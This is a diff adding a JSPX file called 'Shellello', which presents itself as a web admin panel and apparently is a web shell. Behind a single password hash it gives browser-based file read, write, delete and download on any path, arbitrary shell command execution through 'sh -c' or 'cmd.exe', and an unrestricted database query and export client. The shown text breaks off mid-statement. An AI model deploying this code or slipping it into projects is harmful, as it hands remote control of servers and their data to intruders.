@@ -1,0 +1,1532 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+<jsp:directive.page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" trimDirectiveWhitespaces="true"/>
+<jsp:directive.page import="java.io.*,java.nio.file.*,java.nio.charset.*,java.util.*,java.security.*,java.sql.*,java.text.*,javax.servlet.*,javax.servlet.http.*"/>
+
+<jsp:declaration><![CDATA[
+// ==========================================
+// Shellello - Web Admin Panel JSPX Edition
+// Version: 2.5.0 | Built: 2025-12-25
+// ==========================================
+
+private static final String APP_NAME = "Shellello Admin";
+private static final String APP_VERSION = "2.5.0";
+private static final boolean DEBUG_MODE = true;
+private static final String AUTH_HASH = "432d8194182647bfe08cae6592b190a7d35be2c9d302e25e4d070d404501d7fd";
+
+private String toJson(Map<String, Object> map) {
+    StringBuilder sb = new StringBuilder();
+    sb.append("{");
+    boolean first = true;
+    for (Map.Entry<String, Object> entry : map.entrySet()) {
+        if (!first) sb.append(",");
+        first = false;
+        sb.append("\"").append(escapeJsonString(entry.getKey())).append("\":");
+        Object value = entry.getValue();
+        if (value == null) {
+            sb.append("null");
+        } else if (value instanceof String) {
+            sb.append("\"").append(escapeJsonString((String)value)).append("\"");
+        } else if (value instanceof Number || value instanceof Boolean) {
+            sb.append(value);
+        } else if (value instanceof List) {
+            sb.append(toJsonArray((List)value));
+        } else {
+            sb.append("\"").append(escapeJsonString(value.toString())).append("\"");
+        }
+    }
+    sb.append("}");
+    return sb.toString();
+}
+
+private String toJsonArray(List list) {
+    StringBuilder sb = new StringBuilder();
+    sb.append("[");
+    boolean first = true;
+    for (Object item : list) {
+        if (!first) sb.append(",");
+        first = false;
+        if (item instanceof Map) {
+            sb.append(toJson((Map<String, Object>)item));
+        } else if (item instanceof String) {
+            sb.append("\"").append(escapeJsonString((String)item)).append("\"");
+        } else if (item == null) {
+            sb.append("null");
+        } else {
+            sb.append(item);
+        }
+    }
+    sb.append("]");
+    return sb.toString();
+}
+
+private String escapeJsonString(String str) {
+    if (str == null) return "";
+    StringBuilder sb = new StringBuilder();
+    for (int i = 0; i < str.length(); i++) {
+        char ch = str.charAt(i);
+        switch (ch) {
+            case '"':
+                sb.append("\\\"");
+                break;
+            case '\\':
+                sb.append("\\\\");
+                break;
+            case '\b':
+                sb.append("\\b");
+                break;
+            case '\f':
+                sb.append("\\f");
+                break;
+            case '\n':
+                sb.append("\\n");
+                break;
+            case '\r':
+                sb.append("\\r");
+                break;
+            case '\t':
+                sb.append("\\t");
+                break;
+            default:
+                if (ch < ' ') {
+                    String hex = "000" + Integer.toHexString(ch);
+                    sb.append("\\u").append(hex.substring(hex.length() - 4));
+                } else {
+                    sb.append(ch);
+                }
+        }
+    }
+    return sb.toString();
+}
+
+private boolean isAuthenticated(HttpSession session) {
+    Boolean auth = (Boolean) session.getAttribute("authenticated");
+    return auth != null && auth;
+}
+
+private String computeSHA256(String input) {
+    try {
+        MessageDigest md = MessageDigest.getInstance("SHA-256");
+        byte[] hash = md.digest(input.getBytes(StandardCharsets.UTF_8));
+        StringBuilder hexString = new StringBuilder();
+        for (byte b : hash) {
+            String hex = Integer.toHexString(0xff & b);
+            if (hex.length() == 1) hexString.append('0');
+            hexString.append(hex);
+        }
+        return hexString.toString();
+    } catch (Exception e) {
+        return "";
+    }
+}
+
+private String getSessionTime(HttpSession session) {
+    Long loginTime = (Long) session.getAttribute("login_time");
+    if (loginTime == null) return "0m";
+    long duration = System.currentTimeMillis() - loginTime;
+    if (duration >= 3600000) return (duration / 3600000) + "h";
+    return (duration / 60000) + "m";
+}
+
+private String getClientIp(HttpServletRequest request) {
+    String xff = request.getHeader("X-Forwarded-For");
+    if (xff != null && !xff.isEmpty()) return xff.split(",")[0].trim();
+    return request.getRemoteAddr();
+}
+
+private String formatBytes(long bytes) {
+    String[] units = {"B", "KB", "MB", "GB", "TB"};
+    int i = 0;
+    double size = bytes;
+    while (size >= 1024 && i < units.length - 1) {
+        size /= 1024;
+        i++;
+    }
+    return String.format("%.2f %s", size, units[i]);
+}
+
+private String escapeHtml(String text) {
+    if (text == null) return "";
+    return text.replace("&", "&amp;")
+               .replace("<", "&lt;")
+               .replace(">", "&gt;")
+               .replace("\"", "&quot;")
+               .replace("'", "&#39;");
+}
+
+private String escapeJs(String text) {
+    if (text == null) return "";
+    return text.replace("\\", "\\\\")
+               .replace("'", "\\'")
+               .replace("\"", "\\\"")
+               .replace("\n", "\\n")
+               .replace("\r", "\\r");
+}
+
+private String escapeCsv(String s) {
+    if (s == null) return "";
+    if (s.contains(",") || s.contains("\"") || s.contains("\n")) {
+        return "\"" + s.replace("\"", "\"\"") + "\"";
+    }
+    return s;
+}
+
+private String normalizePath(String path) {
+    return path.replace('\\', '/');
+}
+
+private List<Map<String, Object>> getFileList(String dirPath) {
+    List<Map<String, Object>> files = new ArrayList<>();
+    try {
+        Path dir = Paths.get(dirPath);
+        if (!Files.exists(dir)) return files;
+        if (dir.getParent() != null) {
+            Map<String, Object> parent = new HashMap<>();
+            parent.put("name", "..");
+            parent.put("type", "dir");
+            parent.put("size", "-");
+            parent.put("perms", "");
+            parent.put("owner", "");
+            parent.put("modified", "");
+            files.add(parent);
+        }
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
+        try (java.util.stream.Stream<Path> stream = Files.list(dir)) {
+            stream.forEach(path -> {
+                try {
+                    Map<String, Object> file = new HashMap<>();
+                    file.put("name", path.getFileName().toString());
+                    file.put("type", Files.isDirectory(path) ? "dir" : "file");
+                    file.put("size", Files.isDirectory(path) ? "-" : formatBytes(Files.size(path)));
+                    file.put("perms", Files.isReadable(path) ? "r" : "-" + (Files.isWritable(path) ? "w" : "-"));
+                    try {
+                        file.put("owner", Files.getOwner(path).getName());
+                    } catch (Exception e) {
+                        file.put("owner", "N/A");
+                    }
+                    file.put("modified", sdf.format(new java.util.Date(Files.getLastModifiedTime(path).toMillis())));
+                    files.add(file);
+                } catch (IOException e) {}
+            });
+        }
+        files.sort((a, b) -> {
+            boolean aDir = "dir".equals(a.get("type"));
+            boolean bDir = "dir".equals(b.get("type"));
+            if (aDir && !bDir) return -1;
+            if (!aDir && bDir) return 1;
+            return ((String)a.get("name")).compareTo((String)b.get("name"));
+        });
+    } catch (IOException e) {}
+    return files;
+}
+
+private Map<String, Object> executeCommand(String cmd, String cwd) {
+    Map<String, Object> result = new HashMap<>();
+    File workDir = (cwd != null && !cwd.isEmpty()) ? new File(cwd) : new File(System.getProperty("user.dir"));
+    String newCwd = workDir.getAbsolutePath();
+    try {
+        if (cmd.trim().startsWith("cd ")) {
+            String targetDir = cmd.trim().substring(3).trim();
+            File target = new File(workDir, targetDir);
+            if (target.exists() && target.isDirectory()) {
+                newCwd = target.getCanonicalPath();
+                result.put("output", "Changed directory to: " + newCwd);
+                result.put("exit_code", 0);
+            } else {
+                result.put("output", "Directory not found: " + targetDir);
+                result.put("exit_code", 1);
+            }
+        } else {
+            ProcessBuilder pb = new ProcessBuilder();
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                pb.command("cmd.exe", "/c", cmd);
+            } else {
+                pb.command("sh", "-c", cmd);
+            }
+            pb.directory(workDir);
+            pb.redirectErrorStream(true);
+            Process process = pb.start();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                output.append(line).append("\n");
+            }
+            int exitCode = process.waitFor();
+            result.put("output", output.toString());
+            result.put("exit_code", exitCode);
+        }
+    } catch (Exception e) {
+        result.put("output", "Error: " + e.getMessage());
+        result.put("exit_code", -1);
+    }
+    result.put("cwd", newCwd);
+    return result;
+}
+
+private Connection getDbConnection(HttpSession session) throws Exception {
+    String driver = (String) session.getAttribute("db_driver");
+    String host = (String) session.getAttribute("db_host");
+    String port = (String) session.getAttribute("db_port");
+    String dbname = (String) session.getAttribute("db_name");
+    String user = (String) session.getAttribute("db_user");
+    String pass = (String) session.getAttribute("db_pass");
+    String url;
+    
+    if ("mysql".equals(driver)) {
+        // Try loading MySQL or MariaDB drivers
+        try {
+            Class.forName("com.mysql.cj.jdbc.Driver");
+            url = "jdbc:mysql://" + host + ":" + port + "/" + dbname;
+        } catch (ClassNotFoundException e1) {
+            try {
+                Class.forName("com.mysql.jdbc.Driver");
+                url = "jdbc:mysql://" + host + ":" + port + "/" + dbname;
+            } catch (ClassNotFoundException e2) {
+                try {
+                    Class.forName("org.mariadb.jdbc.Driver");
+                    url = "jdbc:mariadb://" + host + ":" + port + "/" + dbname;
+                } catch (ClassNotFoundException e3) {
+                    throw new Exception("No MySQL/MariaDB driver found. Please install libmysql-java or copy mysql-connector.jar to the server's lib folder.");
+                }
+            }
+        }
+    } else if ("postgres".equals(driver)) {
+        try {
+            Class.forName("org.postgresql.Driver");
+        } catch (ClassNotFoundException e) {
+            throw new Exception("PostgreSQL driver not found.");
+        }
+        url = "jdbc:postgresql://" + host + ":" + port + "/" + dbname;
+    } else if ("sqlserver".equals(driver)) {
+        try {
+            Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
+        } catch (ClassNotFoundException e) {
+            throw new Exception("SQL Server driver not found.");
+        }
+        url = "jdbc:sqlserver://" + host + ":" + port + ";databaseName=" + dbname;
+    } else {
+        throw new Exception("Unsupported database driver");
+    }
+    return DriverManager.getConnection(url, user, pass);
+}
+
+private Map<String, Object> executeDbQuery(HttpSession session, String query) throws Exception {
+    Map<String, Object> result = new HashMap<>();
+    List<String> columns = new ArrayList<>();
+    List<Map<String, Object>> rows = new ArrayList<>();
+    Connection conn = null;
+    Statement stmt = null;
+    ResultSet rs = null;
+    try {
+        conn = getDbConnection(session);
+        stmt = conn.createStatement();
+        boolean hasResults = stmt.execute(query);
+        
+        if (hasResults) {
+            rs = stmt.getResultSet();
+            ResultSetMetaData meta = rs.getMetaData();
+            int columnCount = meta.getColumnCount();
+            for (int i = 1; i <= columnCount; i++) {
+                String label = meta.getColumnLabel(i);
+                if (label == null || label.isEmpty()) label = meta.getColumnName(i);
+                columns.add(label);
+            }
+            while (rs.next()) {
+                Map<String, Object> row = new HashMap<>();
+                for (int i = 1; i <= columnCount; i++) {
+                    Object val = rs.getObject(i);
+                    if (val instanceof byte[]) {
+                        val = "[Binary Data]"; // Avoid encoding issues
+                    }
+                    row.put(columns.get(i-1), val);
+                }
+                rows.add(row);
+            }
+        } else {
+            result.put("affected", stmt.getUpdateCount());
+        }
+        
+        result.put("columns", columns);
+        result.put("rows", rows);
+    } finally {
+        if (rs != null) try { rs.close(); } catch (Exception e) {}
+        if (stmt != null) try { stmt.close(); } catch (Exception e) {}
+        if (conn != null) try { conn.close(); } catch (Exception e) {}
+    }
+    return result;
+}
+
+private void handleApiRequest(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspWriter out) throws IOException, ServletException {
+    try { out.clear(); } catch (Exception e) {} // Clear any existing buffer content
+    if (request.getCharacterEncoding() == null) request.setCharacterEncoding("UTF-8");
+
+    if (!isAuthenticated(session)) {
+        response.setContentType("application/json");
+        response.setCharacterEncoding("UTF-8");
+        out.print("{\"status\":\"error\",\"message\":\"Not authenticated\"}");
+        out.flush();
+        return;
+    }
+    
+    String action = request.getParameter("action");
+    
+    try {
+        // Handle special actions that modify response type
+        if ("db_export_csv".equals(action)) {
+            handleDbExportCsv(request, response, session, out);
+            return;
+        }
+        if ("download".equals(action)) {
+            handleDownload(request, response);
+            return;
+        }
+        
+        response.setContentType("application/json");
+        response.setCharacterEncoding("UTF-8");
+        Map<String, Object> result = new HashMap<>();
+        
+        switch (action) {
+            case "list_files":
+                handleListFiles(request, response, result);
+                break;
+            case "read_file":
+                handleReadFile(request, response, result);
+                break;
+            case "save_file":
+                handleSaveFile(request, response, result);
+                break;
+            case "create_file":
+                handleCreateFile(request, response, result);
+                break;
+            case "create_folder":
+                handleCreateFolder(request, response, result);
+                break;
+            case "delete_item":
+                handleDeleteItem(request, response, result);
+                break;
+            case "rename_item":
+                handleRenameItem(request, response, result);
+                break;
+            case "exec_cmd":
+                handleExecCmd(request, response, result);
+                break;
+            case "db_connect":
+                handleDbConnect(request, response, result, session);
+                break;
+            case "db_disconnect":
+                session.removeAttribute("db_driver");
+                session.removeAttribute("db_conn");
+                result.put("status", "success");
+                result.put("message", "Disconnected");
+                break;
+            case "db_tables":
+                handleDbTables(request, response, result, session);
+                break;
+            case "db_query":
+                handleDbQuery(request, response, result, session);
+                break;
+            default:
+                result.put("status", "error");
+                result.put("message", "Unknown action");
+        }
+        out.print(toJson(result));
+        out.flush();
+    } catch (Throwable e) {
+        if (!response.isCommitted()) {
+            try { out.clear(); } catch (Exception ex) {}
+            response.setContentType("application/json");
+            response.setCharacterEncoding("UTF-8");
+            Map<String, Object> error = new HashMap<>();
+            error.put("status", "error");
+            String errMsg = e.getMessage();
+            if (errMsg == null) errMsg = "Operation failed: " + e.getClass().getName();
+            error.put("message", DEBUG_MODE ? errMsg : "Operation failed");
+            out.print(toJson(error));
+            out.flush();
+        }
+    }
+}
+
+private void handleListFiles(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result) {
+    String path = request.getParameter("path");
+    if (path == null || path.isEmpty()) path = System.getProperty("user.dir");
+    result.put("status", "success");
+    result.put("path", normalizePath(path));
+    result.put("data", getFileList(path));
+}
+
+private void handleReadFile(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result) throws IOException {
+    String filePath = request.getParameter("path");
+    String content = new String(Files.readAllBytes(Paths.get(filePath)), StandardCharsets.UTF_8);
+    result.put("status", "success");
+    result.put("content", content);
+}
+
+private void handleSaveFile(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result) throws IOException {
+    String savePath = request.getParameter("path");
+    String saveContent = request.getParameter("content");
+    if (savePath == null || saveContent == null) {
+        String ct = request.getContentType();
+        if (ct != null && ct.toLowerCase().startsWith("multipart/")) {
+            throw new IOException("Please refresh the page (Ctrl+F5) to load new scripts.");
+        }
+        throw new IOException("Missing path or content parameter. CT: " + ct);
+    }
+    Files.write(Paths.get(savePath), saveContent.getBytes(StandardCharsets.UTF_8));
+    result.put("status", "success");
+    result.put("message", "File saved successfully");
+}
+
+private void handleCreateFile(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result) throws IOException {
+    String createDir = request.getParameter("path");
+    String fileName = request.getParameter("name");
+    if (createDir == null || fileName == null) {
+        String ct = request.getContentType();
+        if (ct != null && ct.toLowerCase().startsWith("multipart/")) {
+            throw new IOException("Please refresh the page (Ctrl+F5) to load new scripts.");
+        }
+        throw new IOException("Missing path or name parameter. CT: " + ct);
+    }
+    Files.createFile(Paths.get(createDir, fileName));
+    result.put("status", "success");
+    result.put("message", "File created");
+}
+
+private void handleCreateFolder(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result) throws IOException {
+    String folderDir = request.getParameter("path");
+    String folderName = request.getParameter("name");
+    if (folderDir == null || folderName == null) {
+        String ct = request.getContentType();
+        if (ct != null && ct.toLowerCase().startsWith("multipart/")) {
+            throw new IOException("Please refresh the page (Ctrl+F5) to load new scripts.");
+        }
+        throw new IOException("Missing path or name parameter. CT: " + ct);
+    }
+    Files.createDirectory(Paths.get(folderDir, folderName));
+    result.put("status", "success");
+    result.put("message", "Folder created");
+}
+
+private void handleDeleteItem(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result) throws IOException {
+    String deletePath = request.getParameter("path");
+    Path delPath = Paths.get(deletePath);
+    if (Files.isDirectory(delPath)) {
+        try (java.util.stream.Stream<Path> walk = Files.walk(delPath)) {
+            walk.sorted(Comparator.reverseOrder()).forEach(p -> {
+                try { Files.delete(p); } catch (IOException e) {}
+            });
+        }
+    } else {
+        Files.delete(delPath);
+    }
+    result.put("status", "success");
+    result.put("message", "Deleted successfully");
+}
+
+private void handleRenameItem(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result) throws IOException {
+    String oldPath = request.getParameter("old_path");
+    String newName = request.getParameter("new_name");
+    Path old = Paths.get(oldPath);
+    Path newPath = old.getParent().resolve(newName);
+    Files.move(old, newPath);
+    result.put("status", "success");
+    result.put("message", "Renamed successfully");
+}
+
+private void handleDownload(HttpServletRequest request, HttpServletResponse response) throws IOException {
+    String downloadPath = request.getParameter("path");
+    File file = new File(downloadPath);
+    if (file.exists()) {
+        response.setContentType("application/octet-stream");
+        response.setHeader("Content-Disposition", "attachment; filename=" + file.getName());
+        try (FileInputStream fis = new FileInputStream(file);
+             OutputStream os = response.getOutputStream()) {
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = fis.read(buffer)) != -1) {
+                os.write(buffer, 0, bytesRead);
+            }
+        }
+    }
+}
+
+private void handleExecCmd(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result) {
+    String cmd = request.getParameter("cmd");
+    String cmdCwd = request.getParameter("cwd");
+    Map<String, Object> cmdResult = executeCommand(cmd, cmdCwd);
+    result.put("status", "success");
+    result.put("data", cmdResult);
+}
+
+private void handleDbConnect(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result, HttpSession session) {
+    try {
+        String driver = request.getParameter("driver");
+        String host = request.getParameter("host");
+        String port = request.getParameter("port");
+        String dbname = request.getParameter("dbname");
+        String user = request.getParameter("user");
+        String pass = request.getParameter("pass");
+        
+        session.setAttribute("db_driver", driver);
+        session.setAttribute("db_host", host);
+        session.setAttribute("db_port", port);
+        session.setAttribute("db_name", dbname);
+        session.setAttribute("db_user", user);
+        session.setAttribute("db_pass", pass);
+        
+        // Test connection
+        Connection conn = getDbConnection(session);
+        session.setAttribute("db_conn", "connected");
+        conn.close();
+        
+        result.put("status", "success");
+        result.put("message", "Connected to database");
+    } catch (Exception e) {
+        result.put("status", "error");
+        result.put("message", e.getMessage());
+    }
+}
+
+private void handleDbTables(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result, HttpSession session) throws Exception {
+    Connection conn = getDbConnection(session);
+    DatabaseMetaData meta = conn.getMetaData();
+    ResultSet rs = meta.getTables(null, null, "%", new String[]{"TABLE"});
+    List<String> tables = new ArrayList<>();
+    while (rs.next()) {
+        tables.add(rs.getString("TABLE_NAME"));
+    }
+    conn.close();
+    result.put("status", "success");
+    result.put("tables", tables);
+}
+
+private void handleDbQuery(HttpServletRequest request, HttpServletResponse response, Map<String, Object> result, HttpSession session) {
+    String query = request.getParameter("query");
+    if (query == null || query.trim().isEmpty()) {
+        result.put("status", "error");
+        result.put("message", "Query is required");
+        return;
+    }
+    try {
+        // Use the unified executeDbQuery which handles both SELECT and UPDATE
+        Map<String, Object> queryResult = executeDbQuery(session, query);
+        result.put("status", "success");
+        result.put("data", queryResult);
+    } catch (Exception e) {
+        result.put("status", "error");
+        String errMsg = e.getMessage();
+        if (errMsg == null) errMsg = "Database query failed";
+        result.put("message", errMsg);
+    }
+}
+
+private void handleDbExportCsv(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspWriter out) throws Exception {
+    String csvQuery = request.getParameter("query");
+    Map<String, Object> csvData = executeDbQuery(session, csvQuery);
+    
+    response.setContentType("text/csv; charset=utf-8");
+    response.setHeader("Content-Disposition", "attachment; filename=export_" + 
+        new SimpleDateFormat("yyyy-MM-dd_HHmmss").format(new java.util.Date()) + ".csv");
+    
+    List<String> cols = (List<String>) csvData.get("columns");
+    List<Map<String, Object>> csvRows = (List<Map<String, Object>>) csvData.get("rows");
+    
+    // Write header
+    for (int i = 0; i < cols.size(); i++) {
+        if (i > 0) out.print(",");
+        out.print(escapeCsv(cols.get(i)));
+    }
+    out.println();
+    
+    // Write rows
+    for (Map<String, Object> row : csvRows) {
+        for (int i = 0; i < cols.size(); i++) {
+            if (i > 0) out.print(",");
+            Object val = row.get(cols.get(i));
+            out.print(val != null ? escapeCsv(val.toString()) : "");
+        }
+        out.println();
+    }
+    out.flush();
+}
+
+private String renderDashboardContent() {
+    Runtime runtime = Runtime.getRuntime();
+    long totalMem = runtime.totalMemory();
+    long freeMem = runtime.freeMemory();
+    long usedMem = totalMem - freeMem;
+    File[] roots = File.listRoots();
+    long totalDisk = 0, freeDisk = 0;
+    for (File root : roots) {
+        totalDisk += root.getTotalSpace();
+        freeDisk += root.getFreeSpace();
+    }
+    
+    StringBuilder sb = new StringBuilder();
+    sb.append("<div class=\"card\">");
+    sb.append("<div class=\"card-header\"><span class=\"card-icon\">📊</span><h3>System Information</h3></div>");
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Operating System</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(System.getProperty("os.name") + " " + System.getProperty("os.version") + " (" + System.getProperty("os.arch") + ")")).append("</span></div>");
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Java Version</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(System.getProperty("java.version") + " (" + System.getProperty("java.vendor") + ")")).append("</span></div>");
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Java Home</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(System.getProperty("java.home"))).append("</span></div>");
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">User Home</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(System.getProperty("user.home"))).append("</span></div>");
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Current Directory</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(System.getProperty("user.dir"))).append("</span></div>");
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Memory Usage</span>");
+    sb.append("<span class=\"info-value\">").append(formatBytes(usedMem)).append(" / ").append(formatBytes(totalMem)).append(" (Free: ").append(formatBytes(freeMem)).append(")</span></div>");
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Disk Space</span>");
+    sb.append("<span class=\"info-value\">").append(formatBytes(totalDisk - freeDisk)).append(" / ").append(formatBytes(totalDisk)).append(" (Free: ").append(formatBytes(freeDisk)).append(")</span></div>");
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Processors</span>");
+    sb.append("<span class=\"info-value\">").append(runtime.availableProcessors()).append(" cores</span></div>");
+    sb.append("</div>");
+    
+    sb.append("<div class=\"card\"><div class=\"card-header\"><span class=\"card-icon\">🚀</span><h3>Quick Actions</h3></div>");
+    sb.append("<div style=\"display:flex;gap:1rem;padding:1rem\">");
+    sb.append("<a href=\"?page=files\" class=\"btn btn-primary\">📁 Manage Files</a>");
+    sb.append("<a href=\"?page=terminal\" class=\"btn btn-primary\">💻 Open Terminal</a>");
+    sb.append("<a href=\"?page=database\" class=\"btn btn-primary\">🗄️ Database Client</a>");
+    sb.append("<a href=\"?page=settings\" class=\"btn btn-secondary\">⚙️ Settings</a>");
+    sb.append("</div></div>");
+    
+    return sb.toString();
+}
+
+private String renderFilesContent() {
+    StringBuilder sb = new StringBuilder();
+    sb.append("<div class=\"card\">");
+    sb.append("<div class=\"card-header\"><span class=\"card-icon\">📁</span><h3>File Manager</h3></div>");
+    sb.append("<div class=\"toolbar\">");
+    sb.append("<div class=\"path-nav\">");
+    sb.append("<button class=\"btn btn-sm btn-secondary\" onclick=\"goUp()\">⬆️ Up</button>");
+    sb.append("<input type=\"text\" id=\"currentPath\" class=\"form-control path-input\" readonly=\"readonly\" onclick=\"enablePathEdit()\" onkeypress=\"if(event.key==='Enter')navigateToPath()\"/>");
+    sb.append("<button class=\"btn btn-sm btn-primary\" onclick=\"navigateToPath()\">Go</button>");
+    sb.append("</div>");
+    sb.append("<div class=\"toolbar-actions\">");
+    sb.append("<button class=\"btn btn-sm btn-primary\" onclick=\"openNewFileModal()\">➕ File</button>");
+    sb.append("<button class=\"btn btn-sm btn-primary\" onclick=\"openNewFolderModal()\">📁 Folder</button>");
+    sb.append("<button class=\"btn btn-sm btn-secondary\" onclick=\"refreshFiles()\">🔄 Refresh</button>");
+    sb.append("</div></div>");
+    sb.append("<table class=\"file-table\"><thead><tr>");
+    sb.append("<th>Name</th><th>Size</th><th>Permissions</th><th>Owner</th><th>Modified</th><th>Actions</th>");
+    sb.append("</tr></thead><tbody id=\"fileList\"><tr><td colspan=\"6\" class=\"text-center text-muted\">Loading...</td></tr></tbody></table>");
+    sb.append("</div>");
+    
+    // Modals
+    sb.append("<div id=\"editorModal\" class=\"modal-overlay\">");
+    sb.append("<div class=\"modal modal-lg\"><div class=\"modal-header\"><h3 id=\"editorTitle\">Edit File</h3>");
+    sb.append("<button class=\"modal-close\" onclick=\"closeModal('editorModal')\">&times;</button></div>");
+    sb.append("<div class=\"modal-body\"><textarea id=\"fileEditor\" class=\"file-editor\"></textarea></div>");
+    sb.append("<div class=\"modal-footer\">");
+    sb.append("<button class=\"btn btn-secondary\" onclick=\"closeModal('editorModal')\">Cancel</button>");
+    sb.append("<button class=\"btn btn-primary\" onclick=\"saveFile()\">💾 Save</button></div></div></div>");
+    
+    sb.append("<div id=\"newFileModal\" class=\"modal-overlay\">");
+    sb.append("<div class=\"modal\"><div class=\"modal-header\"><h3>Create New File</h3>");
+    sb.append("<button class=\"modal-close\" onclick=\"closeModal('newFileModal')\">&times;</button></div>");
+    sb.append("<div class=\"modal-body\"><input type=\"text\" id=\"newFileName\" class=\"form-control\" placeholder=\"Enter file name\"/></div>");
+    sb.append("<div class=\"modal-footer\">");
+    sb.append("<button class=\"btn btn-secondary\" onclick=\"closeModal('newFileModal')\">Cancel</button>");
+    sb.append("<button class=\"btn btn-primary\" onclick=\"createNewFile()\">Create</button></div></div></div>");
+    
+    sb.append("<div id=\"newFolderModal\" class=\"modal-overlay\">");
+    sb.append("<div class=\"modal\"><div class=\"modal-header\"><h3>Create New Folder</h3>");
+    sb.append("<button class=\"modal-close\" onclick=\"closeModal('newFolderModal')\">&times;</button></div>");
+    sb.append("<div class=\"modal-body\"><input type=\"text\" id=\"newFolderName\" class=\"form-control\" placeholder=\"Enter folder name\"/></div>");
+    sb.append("<div class=\"modal-footer\">");
+    sb.append("<button class=\"btn btn-secondary\" onclick=\"closeModal('newFolderModal')\">Cancel</button>");
+    sb.append("<button class=\"btn btn-primary\" onclick=\"createNewFolder()\">Create</button></div></div></div>");
+    
+    sb.append("<div id=\"deleteModal\" class=\"modal-overlay\">");
+    sb.append("<div class=\"modal\"><div class=\"modal-header\"><h3>Confirm Delete</h3>");
+    sb.append("<button class=\"modal-close\" onclick=\"closeModal('deleteModal')\">&times;</button></div>");
+    sb.append("<div class=\"modal-body\"><p>Are you sure you want to delete <strong id=\"deleteItemName\"></strong>?</p></div>");
+    sb.append("<div class=\"modal-footer\">");
+    sb.append("<button class=\"btn btn-secondary\" onclick=\"closeModal('deleteModal')\">Cancel</button>");
+    sb.append("<button class=\"btn btn-danger\" onclick=\"confirmDelete()\">Delete</button></div></div></div>");
+    
+    sb.append("<div id=\"renameModal\" class=\"modal-overlay\">");
+    sb.append("<div class=\"modal\"><div class=\"modal-header\"><h3>Rename</h3>");
+    sb.append("<button class=\"modal-close\" onclick=\"closeModal('renameModal')\">&times;</button></div>");
+    sb.append("<div class=\"modal-body\"><input type=\"text\" id=\"renameInput\" class=\"form-control\" placeholder=\"Enter new name\"/></div>");
+    sb.append("<div class=\"modal-footer\">");
+    sb.append("<button class=\"btn btn-secondary\" onclick=\"closeModal('renameModal')\">Cancel</button>");
+    sb.append("<button class=\"btn btn-primary\" onclick=\"confirmRename()\">Rename</button></div></div></div>");
+    
+    return sb.toString();
+}
+
+private String renderTerminalContent(String cwd) {
+    StringBuilder sb = new StringBuilder();
+    sb.append("<div class=\"card\">");
+    sb.append("<div class=\"card-header\"><span class=\"card-icon\">💻</span><h3>Terminal</h3></div>");
+    sb.append("<div class=\"terminal-container\">");
+    sb.append("<div id=\"terminalOutput\" class=\"terminal-output\">Welcome to JSPX Terminal\\n");
+    sb.append("Current directory: ").append(escapeHtml(cwd)).append("\\n\\n</div>");
+    sb.append("<div class=\"terminal-input\">");
+    sb.append("<input type=\"text\" id=\"terminalCmd\" placeholder=\"Enter command...\" onkeypress=\"if(event.key==='Enter')executeCmd()\"/>");
+    sb.append("<button class=\"btn btn-sm btn-primary\" onclick=\"executeCmd()\">Run</button>");
+    sb.append("<button class=\"btn btn-sm btn-secondary\" onclick=\"clearTerminal()\">Clear</button>");
+    sb.append("</div></div></div>");
+    return sb.toString();
+}
+
+private String renderDatabaseContent(HttpSession session) {
+    String driver = (String) session.getAttribute("db_driver");
+    boolean connected = session.getAttribute("db_conn") != null;
+    
+    StringBuilder sb = new StringBuilder();
+    sb.append("<div class=\"card\">");
+    sb.append("<div class=\"card-header\"><span class=\"card-icon\">🗄️</span><h3>Database Client</h3></div>");
+    
+    if (!connected) {
+        sb.append("<div class=\"db-form\">");
+        sb.append("<select id=\"dbDriver\" class=\"form-control\"><option value=\"mysql\">MySQL</option><option value=\"postgresql\">PostgreSQL</option></select>");
+        sb.append("<input type=\"text\" id=\"dbHost\" class=\"form-control\" placeholder=\"Host\" value=\"localhost\"/>");
+        sb.append("<input type=\"text\" id=\"dbPort\" class=\"form-control\" placeholder=\"Port\" value=\"3306\"/>");
+        sb.append("<input type=\"text\" id=\"dbName\" class=\"form-control\" placeholder=\"Database\"/>");
+        sb.append("<input type=\"text\" id=\"dbUser\" class=\"form-control\" placeholder=\"Username\"/>");
+        sb.append("<input type=\"password\" id=\"dbPass\" class=\"form-control\" placeholder=\"Password\"/>");
+        sb.append("</div>");
+        sb.append("<button class=\"btn btn-primary\" onclick=\"dbConnect()\">🔗 Connect</button>");
+    } else {
+        sb.append("<div style=\"margin-bottom:1rem;\">");
+        sb.append("<span style=\"color:#28a745;font-weight:600\">✅ Connected to ").append(escapeHtml(driver)).append("</span> ");
